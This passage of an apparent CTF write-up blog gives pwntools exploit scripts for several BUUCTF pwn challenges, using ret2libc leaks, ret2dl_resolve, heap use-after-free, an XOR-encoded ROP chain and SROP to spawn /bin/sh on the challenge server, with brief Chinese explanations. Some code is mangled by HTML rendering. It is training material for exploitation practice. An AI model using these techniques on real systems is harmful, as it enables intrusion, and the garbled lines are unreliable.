class="line">system = libc + lib.symbols['system']</span><br><span class="line">binsh = libc + lib.search("/bin/sh\x00").next()</span><br><span class="line">sleep(0.2)</span><br><span class="line">sh.sendline(p32(system))</span><br><span class="line">sleep(0.2)</span><br><span class="line">sh.sendline("/bin/sh\x00")</span><br><span class="line">payload  = offset * "a"</span><br><span class="line">payload += p32(system) + p32(0xdeadbeef) + p32(binsh)</span><br><span class="line">#sh.sendline(payload)</span><br><span class="line">#sh.recv()</span><br><span class="line">#sh.sendline("1")</span><br><span class="line">log.success("system: " + hex(system))</span><br><span class="line">log.success("binsh: " + hex(binsh))</span><br><span class="line">log.success("__libc_start_main: " + hex(__libc_start_main))</span><br><span class="line">sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">pwn("buuoj.cn",20071,1)</span><br></pre></td></tr></tbody></table></figure></div><h3 id="解法二"><a href="#解法二" class="headerlink" title="解法二:"></a>解法二:</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">from roputils import *</span><br><span class="line">from time import *</span><br><span class="line">from pwn import process</span><br><span class="line">from pwn import gdb</span><br><span class="line">from pwn import context</span><br><span class="line">from pwn import remote</span><br><span class="line">#r = process('./espcially_tu_2016')</span><br><span class="line">r = remote("buuoj.cn",20071)</span><br><span class="line">context.log_level = 'debug'</span><br><span class="line"></span><br><span class="line">rop = ROP('./espcially_tu_2016')</span><br><span class="line">offset = 44</span><br><span class="line">bss_base = rop.section('.bss') + 0x800</span><br><span class="line">buf = rop.fill(offset)</span><br><span class="line"></span><br><span class="line">buf += rop.call('gets', bss_base)</span><br><span class="line">buf += rop.call('gets', bss_base)</span><br><span class="line"># used to call dl_Resolve()</span><br><span class="line">buf += rop.dl_resolve_call(bss_base + 20, bss_base)</span><br><span class="line">r.sendline(buf)</span><br><span class="line">sleep(0.2)</span><br><span class="line">r.sendline("1")</span><br><span class="line">buf = rop.string('/bin/sh')</span><br><span class="line">buf += rop.fill(20, buf)</span><br><span class="line"># used to make faking data, such relocation, Symbol, Str</span><br><span class="line">buf += rop.dl_resolve_data(bss_base + 20, 'system')</span><br><span class="line">buf += rop.fill(100, buf)</span><br><span class="line">sleep(0.2)</span><br><span class="line">r.sendline(buf)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></tbody></table></figure></div><h2 id="0x19-ciscn-2019-en-2"><a href="#0x19-ciscn-2019-en-2" class="headerlink" title="0x19 ciscn_2019_en_2"></a>0x19 ciscn_2019_en_2</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "amd64"</span><br><span class="line">elf = ELF("ciscn_2019_en_2")</span><br><span class="line">sh = 0</span><br><span class="line">lib = 0</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">global sh</span><br><span class="line">global lib</span><br><span class="line">if(debug == 1):</span><br><span class="line">sh = process("./ciscn_2019_en_2")</span><br><span class="line">lib = ELF("/lib/x86_64-linux-gnu/libc.so.6")</span><br><span class="line">else:</span><br><span class="line">sh = remote(ip,port)</span><br><span class="line">lib = ELF("/home/pig/Pig/CTF/BUUCTF/BUUCTF_libc/x64_libc.so.6")</span><br><span class="line">sh.recvuntil("Input your choice!")</span><br><span class="line">sh.sendline("1")</span><br><span class="line">sh.recvuntil("Input your Plaintext to be encrypted")</span><br><span class="line">payload  = "a\x00"</span><br><span class="line">offset = 88</span><br><span class="line">pop_rdi_ret = 0x400c83</span><br><span class="line">payload  = "a" * offset</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(elf.got['__libc_start_main']) + p64(elf.plt['puts'])</span><br><span class="line">payload += p64(elf.symbols['_start'])</span><br><span class="line">sh.recv()</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">libc = u64(sh.recvuntil("\x7f\x0a",)[-7:].ljust(8,"\x00")) % 0x1000000000000 - lib.symbols['__libc_start_main']</span><br><span class="line">system = libc + lib.symbols['system']</span><br><span class="line">binsh = libc + lib.search("/bin/sh\x00").next()</span><br><span class="line"></span><br><span class="line">        sh.recvuntil("Input your choice!")</span><br><span class="line">        sh.sendline("1")</span><br><span class="line">        sh.recvuntil("Input your Plaintext to be encrypted")</span><br><span class="line">        payload  = "a\x00"</span><br><span class="line">        offset = 88</span><br><span class="line">        payload  = "a" * offset</span><br><span class="line">        payload += p64(pop_rdi_ret) + p64(binsh) + p64(system)</span><br><span class="line">        sh.sendline(payload)</span><br><span class="line">log.success("libc: " + hex(libc))</span><br><span class="line">log.success("system: " + hex(system))</span><br><span class="line">log.success("binsh: " + hex(binsh))</span><br><span class="line">sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">pwn("buuoj.cn",20123,0)</span><br></pre></td></tr></tbody></table></figure></div><h2 id="0x20-ciscn-s-4"><a href="#0x20-ciscn-s-4" class="headerlink" title="0x20 ciscn_s_4"></a>0x20 ciscn_s_4</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">sh = 0</span><br><span class="line">elf = ELF("ciscn_s_4")</span><br><span class="line">lib = ELF("/home/pig/Pig/CTF/BUUCTF/BUUCTF_libc/x86_libc.so.6")</span><br><span class="line">#nc 172.29.9.107 9999 </span><br><span class="line"></span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">if(debug == 1):</span><br><span class="line">sh = process("./ciscn_s_4")</span><br><span class="line">else:</span><br><span class="line">sh = remote(ip,port)</span><br><span class="line">pop3_ret = 0x08048699</span><br><span class="line">pop2_ret = 0x0804869a</span><br><span class="line">offset = 44</span><br><span class="line">main_addr = 0x080485FF</span><br><span class="line">payload = (offset-12) * 'a' + p32(0x0804A01C) + "2"*4 + "3"*4+ p32(main_addr)</span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.recvuntil("Hello, ")</span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.recvuntil("Hello, ")</span><br><span class="line">payload = (offset-0x10) * "b"+"5"*4 +p32(0x0804A01C)+"7"*4+"8"*4 +p32(0x0804861D)</span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.recvuntil(payload)</span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.recvuntil(payload)</span><br><span class="line">sh.recv(33-4-4)</span><br><span class="line">libc = u32(sh.recv(4)) - lib.symbols["__libc_start_main"]</span><br><span class="line">log.success("libc :" + hex(libc))</span><br><span class="line">system = 0x08048559</span><br><span class="line">binsh = libc + next(lib.search("/bin/sh"))</span><br><span class="line">log.success("binsh :"+hex(binsh))</span><br><span class="line">log.success("system :"+hex(libc + lib.symbols['system']))</span><br><span class="line">#input()</span><br><span class="line">payload = (offset)*"a" + p32(0x08048450)</span><br><span class="line">sh.send(payload)</span><br><span class="line">payload = (offset-12) * 'a' + p32(binsh) + "2"*4 + "3"*4+ p32(main_addr)</span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.recvuntil("Hello, ")</span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.recvuntil("Hello, ")</span><br><span class="line">payload = (offset-0x10) * "b"+"5"*4 +p32(binsh)+"7"*4+"8"*4 +p32(system)</span><br><span class="line">sh.send(payload)</span><br><span class="line">#sh.recvuntil("Hello, ")</span><br><span class="line">sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">pwn("buuoj.cn",20155,0)</span><br></pre></td></tr></tbody></table></figure></div><h2 id="0x21-ciscn-2019-n-3"><a href="#0x21-ciscn-2019-n-3" class="headerlink" title="0x21 ciscn_2019_n_3"></a>0x21 ciscn_2019_n_3</h2><h2 id="1、利用unsorted-bin-attack知道libc地址"><a href="#1、利用unsorted-bin-attack知道libc地址" class="headerlink" title="1、利用unsorted bin attack知道libc地址"></a>1、利用unsorted bin attack知道libc地址</h2><h2 id="2、存在UAF漏洞，然后利用fastbin-attack，实现堆块重叠，且通过利用unsorted-bin在fd、bk不够放置时，一次性将剩余堆块全部申请回来的特性，使得可以填充进system地址和sh字符串"><a href="#2、存在UAF漏洞，然后利用fastbin-attack，实现堆块重叠，且通过利用unsorted-bin在fd、bk不够放置时，一次性将剩余堆块全部申请回来的特性，使得可以填充进system地址和sh字符串" class="headerlink" title="2、存在UAF漏洞，然后利用fastbin attack，实现堆块重叠，且通过利用unsorted bin在fd、bk不够放置时，一次性将剩余堆块全部申请回来的特性，使得可以填充进system地址和sh字符串"></a>2、存在UAF漏洞，然后利用fastbin attack，实现堆块重叠，且通过利用unsorted bin在fd、bk不够放置时，一次性将剩余堆块全部申请回来的特性，使得可以填充进system地址和sh字符串</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "amd64"</span><br><span class="line">elf = ELF("ciscn_2019_n_3")</span><br><span class="line">sh = 0</span><br><span class="line">lib = 0</span><br><span class="line">def addStr(idx,size,content):</span><br><span class="line">sh.recvuntil("CNote > ")</span><br><span class="line">sh.sendline("1")</span><br><span class="line">sh.recvuntil("Index > ")</span><br><span class="line">sh.sendline(str(idx))</span><br><span class="line">sh.recvuntil("Type > ")</span><br><span class="line">sh.sendline("2")</span><br><span class="line">sh.recvuntil("Length > ")</span><br><span class="line">sh.sendline(str(size))</span><br><span class="line">if content != "":</span><br><span class="line">sh.recvuntil("Value > ")</span><br><span class="line">sh.send(content)</span><br><span class="line">def addInt(idx,num):</span><br><span class="line">        sh.recvuntil("CNote > ")</span><br><span class="line">        sh.sendline("1")</span><br><span class="line">        sh.recvuntil("Index > ")</span><br><span class="line">        sh.sendline(str(idx))</span><br><span class="line">        sh.recvuntil("Type > ")</span><br><span class="line">        sh.sendline("1")</span><br><span class="line">sh.recvuntil("Value > ")</span><br><span class="line">sh.sendline(str(num))</span><br><span class="line">def show(idx):</span><br><span class="line">sh.recvuntil("CNote > ")</span><br><span class="line">sh.sendline("3")</span><br><span class="line">sh.recvuntil("Index > ")</span><br><span class="line">sh.sendline(str(idx))</span><br><span class="line">def free(idx):</span><br><span class="line">sh.recvuntil("CNote > ")</span><br><span class="line">sh.sendline("2")</span><br><span class="line">sh.recvuntil("Index > ")</span><br><span class="line">sh.sendline(str(idx))</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">global sh</span><br><span class="line">global lib</span><br><span class="line">if(debug == 1):</span><br><span class="line">sh = process("./ciscn_2019_n_3")</span><br><span class="line">main_arena_offset = 0xf7763780 - 0xf75b1000</span><br><span class="line">lib = ELF("/lib/i386-linux-gnu/libc.so.6")</span><br><span class="line">else:</span><br><span class="line">sh = remote(ip,port)</span><br><span class="line">lib = ELF("/home/pig/Pig/CTF/BUUCTF/BUUCTF_libc/x86_libc.so.6")</span><br><span class="line">main_arena_offset = 0x1B0780</span><br><span class="line">#leak libc</span><br><span class="line">addStr(0,0x80,"a"*0x7E + "\n")</span><br><span class="line">addInt(1,0xdeadbeef)</span><br><span class="line">free(0)</span><br><span class="line">addStr(2,0,"")</span><br><span class="line">show(2)</span><br><span class="line">sh.recvuntil("Note(Type=String, Value=")</span><br><span class="line">main_arena = u32(sh.recv(4)) - 176</span><br><span class="line">libc = main_arena - main_arena_offset</span><br><span class="line">system = libc + lib.symbols['system']</span><br><span class="line">binsh = libc + lib.search("/bin/sh\x00").next()</span><br><span class="line">one_gadget = libc + 0x3a80c</span><br><span class="line"></span><br><span class="line">#getShell</span><br><span class="line">        addStr(3,0x48,"a"*0x3E + "\n")</span><br><span class="line">addInt(4,0xdeadbeef)</span><br><span class="line">free(4)</span><br><span class="line">payload = "sh\x00\x00" + p32(system) + p32(0xdeadbeef) + '\n'</span><br><span class="line">addStr(5,0x14,payload)</span><br><span class="line">free(4)</span><br><span class="line">log.success("main_arena: " + hex(main_arena))</span><br><span class="line">        log.success("binsh: " + hex(binsh))</span><br><span class="line">        log.success("system: " + hex(system))</span><br><span class="line">        log.success("libc: " + hex(libc))</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">pwn("buuoj.cn",20139,0)</span><br></pre></td></tr></tbody></table></figure></div><h2 id="0x22-ciscn-s-8"><a href="#0x22-ciscn-s-8" class="headerlink" title="0x22 ciscn_s_8"></a>0x22 ciscn_s_8</h2><h3 id="导入ida后，发现是一个异或算法，然后strcpy处存在栈溢出，但是会对输入的文本进行异或0x66的处理，我们可以预先先对payload异或0x66，然后在程序对它再次异或时就会复原回有攻击性的payload"><a href="#导入ida后，发现是一个异或算法，然后strcpy处存在栈溢出，但是会对输入的文本进行异或0x66的处理，我们可以预先先对payload异或0x66，然后在程序对它再次异或时就会复原回有攻击性的payload" class="headerlink" title="导入ida后，发现是一个异或算法，然后strcpy处存在栈溢出，但是会对输入的文本进行异或0x66的处理，我们可以预先先对payload异或0x66，然后在程序对它再次异或时就会复原回有攻击性的payload"></a>导入ida后，发现是一个异或算法，然后strcpy处存在栈溢出，但是会对输入的文本进行异或0x66的处理，我们可以预先先对payload异或0x66，然后在程序对它再次异或时就会复原回有攻击性的payload</h3><h3 id="另外这道题，我为了图方便，且程序是静态编译，ROPgadget往往是可以生成ROPchain的，可以考虑将add-rax-1换成add-rax-3，缩短ROPchain，达成攻击。注意不换成add-rax-3会出现ROPchain被截断的情况"><a href="#另外这道题，我为了图方便，且程序是静态编译，ROPgadget往往是可以生成ROPchain的，可以考虑将add-rax-1换成add-rax-3，缩短ROPchain，达成攻击。注意不换成add-rax-3会出现ROPchain被截断的情况" class="headerlink" title="另外这道题，我为了图方便，且程序是静态编译，ROPgadget往往是可以生成ROPchain的，可以考虑将add rax,1换成add rax,3，缩短ROPchain，达成攻击。注意不换成add rax,3会出现ROPchain被截断的情况"></a>另外这道题，我为了图方便，且程序是静态编译，ROPgadget往往是可以生成ROPchain的，可以考虑将add rax,1换成add rax,3，缩短ROPchain，达成攻击。注意不换成add rax,3会出现ROPchain被截断的情况</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "amd64"</span><br><span class="line">elf = ELF("ciscn_2019_s_8")</span><br><span class="line">sh = 0</span><br><span class="line">lib = 0</span><br><span class="line">def encrypt(data):</span><br><span class="line">crypto = ''</span><br><span class="line">for i in data:</span><br><span class="line">crypto += chr(ord(i) ^ 0x66)</span><br><span class="line">return crypto</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">global sh</span><br><span class="line">global lib</span><br><span class="line">if(debug == 1):</span><br><span class="line">sh = process("./ciscn_2019_s_8")</span><br><span class="line">else:</span><br><span class="line">sh = remote(ip,port)</span><br><span class="line">from struct import pack</span><br><span class="line"></span><br><span class="line"># Padding goes here</span><br><span class="line">p = ''</span><br><span class="line">p += pack('<q', 0x00000000004040fe) # pop rsi ; ret< span><br><span class="line">p += pack('<q', 0x00000000006ba0e0) # @ .data< span><br><span class="line">p += pack('<q', 0x0000000000449b9c) # pop rax ; ret< span><br><span class="line">p += '/bin//sh'</span><br><span class="line">p += pack('<q', 0x000000000047f7b1) # mov qword ptr [rsi], rax ; ret< span><br><span class="line">p += pack('<q', 0x00000000004040fe) # pop rsi ; ret< span><br><span class="line">p += pack('<q', 0x00000000006ba0e8) # @ .data + 8< span><br><span class="line">p += pack('<q', 0x0000000000444f00) # xor rax, rax ; ret< span><br><span class="line">p += pack('<q', 0x000000000047f7b1) # mov qword ptr [rsi], rax ; ret< span><br><span class="line">p += pack('<q', 0x00000000004006e6) # pop rdi ; ret< span><br><span class="line">p += pack('<q', 0x00000000006ba0e0) # @ .data< span><br><span class="line">p += pack('<q', 0x00000000004040fe) # pop rsi ; ret< span><br><span class="line">p += pack('<q', 0x00000000006ba0e8) # @ .data + 8< span><br><span class="line">p += pack('<q', 0x0000000000449bf5) # pop rdx ; ret< span><br><span class="line">p += pack('<q', 0x00000000006ba0e8) # @ .data + 8< span><br><span class="line">p += pack('<q', 0x0000000000444f00) # xor rax, rax ; ret< span><br><span class="line">p += pack('<q', 3 0x0000000000474c11) # add rax, ; ret< span><br><span class="line">p += pack('<q', 3 0x0000000000474c11) # add rax, ; ret< span><br><span class="line">p += pack('<q', 3 0x0000000000474c11) # add rax, ; ret< span><br><span class="line">p += pack('<q', 3 0x0000000000474c11) # add rax, ; ret< span><br><span class="line">p += pack('<q', 3 0x0000000000474c11) # add rax, ; ret< span><br><span class="line">p += pack('<q', 3 0x0000000000474c11) # add rax, ; ret< span><br><span class="line">p += pack('<q', 3 0x0000000000474c11) # add rax, ; ret< span><br><span class="line">p += pack('<q', 3 0x0000000000474c11) # add rax, ; ret< span><br><span class="line">p += pack('<q', 3 0x0000000000474c11) # add rax, ; ret< span><br><span class="line">p += pack('<q', 3 0x0000000000474c11) # add rax, ; ret< span><br><span class="line">p += pack('<q', 3 0x0000000000474c11) # add rax, ; ret< span><br><span class="line">p += pack('<q', 3 0x0000000000474c11) # add rax, ; ret< span><br><span class="line">p += pack('<q', 3 0x0000000000474c11) # add rax, ; ret< span><br><span class="line">p += pack('<q', 3 0x0000000000474c11) # add rax, ; ret< span><br><span class="line">p += pack('<q', 3 0x0000000000474c11) # add rax, ; ret< span><br><span class="line">p += pack('<q', 3 0x0000000000474c11) # add rax, ; ret< span><br><span class="line">p += pack('<q', 3 0x0000000000474c11) # add rax, ; ret< span><br><span class="line">p += pack('<q', 3 0x0000000000474c11) # add rax, ; ret< span><br><span class="line">p += pack('<q', 3 0x0000000000474c11) # add rax, ; ret< span><br><span class="line">p += pack('<q', 2 0x0000000000474bf8) # add rax, ; ret< span><br><span class="line">p += pack('<q', 0x00000000004751a5) # syscall ; ret< span><br><span class="line">offset = 10 * 8</span><br><span class="line">payload = offset * "a"</span><br><span class="line">payload += p</span><br><span class="line">sh.send(encrypt(payload))</span><br><span class="line">sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">pwn("buuoj.cn",20159,0)</span><br></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></pre></td></tr></tbody></table></figure></div><h2 id="0x23-ciscn-s-3"><a href="#0x23-ciscn-s-3" class="headerlink" title="0x23 ciscn_s_3"></a>0x23 ciscn_s_3</h2><h3 id="gadget处可以赋值rax为15，恰好为SYS-SigReturnFrame"><a href="#gadget处可以赋值rax为15，恰好为SYS-SigReturnFrame" class="headerlink" title="gadget处可以赋值rax为15，恰好为SYS_SigReturnFrame"></a>gadget处可以赋值rax为15，恰好为SYS_SigReturnFrame</h3><h3 id="那么思路如下"><a href="#那么思路如下" class="headerlink" title="那么思路如下:"></a>那么思路如下:</h3><h3 id="1、先leak-stack地址，然后顺带的传入-bin-sh-x00字符串，通过leak-stack来定位binsh的位置，再跳回SYS-read处"><a href="#1、先leak-stack地址，然后顺带的传入-bin-sh-x00字符串，通过leak-stack来定位binsh的位置，再跳回SYS-read处" class="headerlink" title="1、先leak stack地址，然后顺带的传入/bin/sh\x00字符串，通过leak stack来定位binsh的位置，再跳回SYS_read处"></a>1、先leak stack地址，然后顺带的传入/bin/sh\x00字符串，通过leak stack来定位binsh的位置，再跳回SYS_read处</h3><h3 id="2、赋值rax为15，跳到syscall上，成功popal-sigframe，此时sigframe的数据由我们输入的数据控制，凑成可以拿shell的形式，即可拿到shell"><a href="#2、赋值rax为15，跳到syscall上，成功popal-sigframe，此时sigframe的数据由我们输入的数据控制，凑成可以拿shell的形式，即可拿到shell" class="headerlink" title="2、赋值rax为15，跳到syscall上，成功popal sigframe，此时sigframe的数据由我们输入的数据控制，凑成可以拿shell的形式，即可拿到shell"></a>2、赋值rax为15，跳到syscall上，成功popal sigframe，此时sigframe的数据由我们输入的数据控制，凑成可以拿shell的形式，即可拿到shell</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "amd64"</span><br><span class="line">elf = ELF("ciscn_2019_s_6")</span><br><span class="line">sh = 0</span><br><span class="line">lib = 0</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">global sh</span><br><span class="line">global lib</span><br><span class="line">if(debug == 1):</span><br><span class="line">sh = process("./ciscn_2019_s_6")</span><br><span class="line">else:</span><br><span class="line">sh = remote(ip,port)</span><br><span class="line"></span><br><span class="line">syscall_ret = 0x400517</span><br><span class="line">mov_rax_ret = 0x4004DA</span><br><span class="line">write_ret = 0x400503</span><br><span class="line">read_write_ret = 0x4004F1</span><br><span class="line">offset = 16</span><br><span class="line">payload  = "//bin/sh\x00"</span><br><span class="line">payload  = payload.ljust(offset,"a")</span><br><span class="line">payload += p64(write_ret) + p64(read_write_ret)</span><br><span class="line">sh.send(payload)</span><br><span class="line">sleep(0.2)</span><br><span class="line">stack_addr = u64(sh.recvuntil("\x7f")[-6:].ljust(8,"\x00"))</span><br><span class="line">binsh = stack_addr 